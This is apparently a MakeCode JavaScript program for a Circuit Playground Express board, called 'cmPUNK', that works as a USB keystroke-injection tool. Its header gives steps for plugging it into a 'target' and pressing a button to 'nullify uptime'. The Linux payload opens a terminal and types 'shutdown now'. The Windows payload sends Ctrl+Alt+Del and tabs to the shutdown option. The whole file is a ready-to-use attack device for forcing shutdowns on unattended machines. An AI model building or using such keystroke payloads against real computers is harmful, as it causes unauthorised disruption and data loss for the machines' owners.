/**
 * Convenient Mobile Plug-N-Press Uptime Nullification Kit
 * 
 *                               (cmPUNK) v1.0
 */
/**
 * 1. Plug into USB port of target
 * 
 * 2. Use Slide Switch (D7) to select target OS:
 * 
 *   - Right Pos (Lights Blue): Windows
 * 
 *   - Left Pos (Lights Orange): Linux
 * 
 * 3. Press B (right button (D5)) to arm payload.
 * 
 *   - Press again to disarm payload.
 * 
 * 4. Press A (left button (D4)) to nullify uptime.
 */
/**
 * NOTE:
 * 
 * If you are pressing the A button and immediately hearing a buzzer sound, the payload has not yet been armed! You can do so by pressing the B button. Once the payload is armed pressing the A button should nullify target uptime.
 */
// Set up two hooks for the slide switch. The value for PAYLOAD is either 1 (Unix) or 2 (Windows) after initialization
input.onSwitchMoved(SwitchDirection.Right, function () {
    light.showAnimation(light.rainbowAnimation, 500)
    PAYLOAD = 2
})
function payloadLinux () {
    keyboard.modifierKey(KeyboardModifierKey.ControlAlt, KeyboardKeyEvent.Down)
    keyboard.key("t", KeyboardKeyEvent.Down)
    pause(200)
    keyboard.modifierKey(KeyboardModifierKey.ControlAlt, KeyboardKeyEvent.Up)
    keyboard.key("t", KeyboardKeyEvent.Up)
    pause(500)
    keyboard.type("shutdown now")
    keyboard.functionKey(KeyboardFunctionKey.Enter, KeyboardKeyEvent.Press)
}
function payloadWindows () {
    keyboard.modifierKey(KeyboardModifierKey.ControlAlt, KeyboardKeyEvent.Down)
    keyboard.functionKey(KeyboardFunctionKey.DeleteForward, KeyboardKeyEvent.Down)
    pause(500)
    keyboard.modifierKey(KeyboardModifierKey.ControlAlt, KeyboardKeyEvent.Up)
    keyboard.functionKey(KeyboardFunctionKey.DeleteForward, KeyboardKeyEvent.Up)
    pause(200)
    for (let index = 0; index < 7; index++) {
        keyboard.functionKey(KeyboardFunctionKey.Tab, KeyboardKeyEvent.Press)
        pause(100)
    }
    pause(500)
    keyboard.functionKey(KeyboardFunctionKey.Enter, KeyboardKeyEvent.Press)
    pause(100)
    keyboard.functionKey(KeyboardFunctionKey.DownArrow, KeyboardKeyEvent.Press)
    pause(500)
    keyboard.functionKey(KeyboardFunctionKey.Enter, KeyboardKeyEvent.Press)
    music.zapped.play()
    light.setAll(0x00ff00)
    pause(1000)
}
input.buttonA.onEvent(ButtonEvent.Click, function () {
    if (armed >= 1) {
        if (PAYLOAD == 1) {
            payloadLinux()
            pause(5000)
        } else {
            payloadWindows()
        }
        armed = 0
        music.baDing.play()
        light.setAll(0xffff00)
        pause(1000)
        light.showAnimation(light.sparkleAnimation, 500)
    }
    music.buzzer.play()
})
input.buttonB.onEvent(ButtonEvent.Click, function () {
    music.stopAllSounds()
    if (armed >= 1) {
        armed = 0
        control.runInParallel(function () {
            music.playMelody("E F G F G F E D ", 120)
        })
        light.showAnimation(light.colorWipeAnimation, 500)
    } else {
        armed = 1
        control.runInParallel(function () {
            music.playMelody("E F E F G A G A ", 300)
        })
        light.showAnimation(light.theaterChaseAnimation, 1000)
        light.setAll(0xff0000)
    }
})
input.onSwitchMoved(SwitchDirection.Left, function () {
    light.showAnimation(light.cometAnimation, 1000)
    music.knock.play()
    PAYLOAD = 1
})
let armed = 0
let PAYLOAD = 0
let isRight = input.switchRight()
if (input.switchRight()) {
    PAYLOAD = 2
} else {
    PAYLOAD = 1
}
light.setBrightness(25)
armed = 0
music.setVolume(255)
pause(1000)
music.powerUp.play()
pause(1000)
music.stopAllSounds()
forever(function () {
    if (armed >= 1) {
        light.showAnimation(light.theaterChaseAnimation, 1000)
    } else {
        light.showAnimation(light.sparkleAnimation, 500)
    }
    if (input.switchRight()) {
        light.setAll(0x007fff)
        pause(2000)
    } else {
        light.setAll(0xff8000)
        pause(2000)
    }
})
